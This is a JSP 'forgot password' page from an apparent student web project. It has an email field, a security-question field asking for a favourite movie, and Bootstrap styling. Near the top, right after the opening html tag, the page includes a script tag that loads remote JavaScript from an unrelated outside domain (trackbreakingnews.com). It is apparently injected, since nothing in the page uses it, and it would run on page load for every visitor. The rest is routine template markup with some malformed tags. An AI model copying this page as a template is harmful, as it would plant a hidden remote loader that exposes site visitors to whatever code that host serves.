<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en"><script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">
  <title>Login</title>
    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <style>
    body{

  background-image:url("iWall/Aerial_view_of_graphic_era_university.jpg");
  background-size:cover;
}
body:before {
    content: " ";
    width: 100%;
    height: 750px;;
    position: absolute;
    z-index: -1;
    top: 0;
    left: 0;
    background: -moz-radial-gradient(top center, ellipse cover, rgba(155,200,255,0.2) 0%,rgba(0,0,0,0.5) 100%);
  background: -webkit-radial-gradient(top center, ellipse cover, rgba(155,200,255,0.2) 0%,rgba(0,0,0,0.5) 100%);
  background: radial-gradient(top center, ellipse cover, rgba(155,200,255,0.2) 0%,rgba(0,0,0,0.5) 100%);
  background: -ms-radial-gradient(top center, ellipse cover, rgba(155,200,255,0.2) 0%,rgba(0,0,0,0.5) 100%);

}
.HX h2{

  text-align: left;
  color: #fff;
  font-size: 39px;
  font-family: Lato;
  font-weight: bolder;
}

.HX p{

  text-align: left;
  font-weight: bold;
  color: #fff;
  font-size: 22px;
  font-family: Lato;
}

.LS {

  border-radius: 8px;
}


.LS1 {

  border-radius: 8px;
}
.Fot{
  width:100%;
  top:350px;
  position:relative;
  padding-top:30px;
  background-color:#000;
  text-align: center;
  
}
.XLL {
  width:350px;
  height:200px;
  background-color: #fff;
}
.XL {
  position:relative;
  right:-25px;
  width: 300px;
  height: 40px;
  padding-top:18px;
}
    </style>
  </head>

        <body>

        <div class="container">
        <header class="page-header">
            <ul class="nav nav-pills pull-right">
                <li> <a href="Home.jsp"> Home </li> </a>
                <li> <a href="About.jsp"> More </li> </a>
            </ul>
            <h2>Login Page</h2>
        </header>
    </div>
</div>

        <div class="container">
            <div class="row">
               <div class="col-lg-7 HX">

                <h2>Welcome. </h2>
                <p><small>
                Connect with your friends and other fascinating <br/>people. Get in-the-moment updates on the things <br/>that interest you. And watch events unfold, in real <br/>time, from every angle.
                </small></p>
               </div>
        <div class="col-lg-4">
            <div class="list-group XLL">
                    <div class="account-wall">
                        <form class="form-group XL" method="post" action="StudForget.jsp">
                          <input type="text" class="form-control" name="xmail" placeholder="email" required autofocus> <br/>
                            <label>What is your fav Movie?</label>
                            <input type="text" class="form-control" name="xans" placeholder="Answer" required> <br/>

                            <a href="SignUp.jsp">Need an Account?</a>                             
                            <button class="btn btn-info pull-right" type="submit"> Submit</button> <br/>
                          </form>
                    </div>
                </a> <br/>
                
                </a>
            </div>
        </div>
    </div>
    </div>
    </div>
  
</div>

   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
    <script src="bootstrap.min.js"></script>
    <script src="docs.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    <script>
  $('.dropdown').hover(function() {
    $('.dropdown-toggle',this).trigger('click');
  });
  </script>
  </body>
</html>
